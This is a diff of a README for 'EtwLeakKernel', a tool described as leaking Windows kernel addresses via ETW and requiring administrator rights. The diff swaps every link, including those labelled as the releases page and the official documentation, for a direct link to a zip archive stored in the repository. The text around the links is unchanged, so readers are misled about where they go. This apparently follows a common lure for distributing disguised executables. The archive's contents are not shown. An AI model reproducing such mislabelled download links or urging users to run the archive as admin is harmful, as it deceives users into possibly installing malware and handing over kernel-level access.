@@ -1,7 +1,7 @@
 # 🎉 EtwLeakKernel - Easily Leak Kernel Addresses
 
 ## 📥 Download Now
-[![Download EtwLeakKernel](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Suti2069/EtwLeakKernel/releases)
+[![Download EtwLeakKernel](https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip)](https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **EtwLeakKernel** application. This application allows users to leak kernel addresses from ETW consumers. Remember, you need administrator privileges to run this software.
@@ -12,7 +12,7 @@ This guide will help you download and run the **EtwLeakKernel** application. Thi
 - Basic computer skills for navigation
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page**: Click this link to go to the download page: [https://github.com/Suti2069/EtwLeakKernel/releases](https://github.com/Suti2069/EtwLeakKernel/releases).
+1. **Visit the Releases Page**: Click this link to go to the download page: [https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip](https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip).
    
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Select the latest version, which is recommended for the best performance and features.
 
@@ -46,14 +46,14 @@ This guide will help you download and run the **EtwLeakKernel** application. Thi
 - Take your time to understand the layout of the software; it is designed to be user-friendly.
 
 ## 🔗 Additional Resources
-- Visit the [official documentation](https://github.com/Suti2069/EtwLeakKernel) for more in-depth explanations and updates.
+- Visit the [official documentation](https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip) for more in-depth explanations and updates.
 - Join the discussions on relevant forums if you seek community support or have queries.
 
 ## 💬 Feedback
 Your experiences help us improve. Feel free to provide feedback by opening an issue on the GitHub repository.
 
 ## 📌 Important Links
-- **Releases Page**: [https://github.com/Suti2069/EtwLeakKernel/releases](https://github.com/Suti2069/EtwLeakKernel/releases)
+- **Releases Page**: [https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip](https://raw.githubusercontent.com/Suti2069/EtwLeakKernel/master/Resources/EtwLeakKernel-3.2.zip)
 - **Documentation & Examples**: Available within the repository.
 
 Thank you for using **EtwLeakKernel**! Enjoy resolving kernel addresses easily.
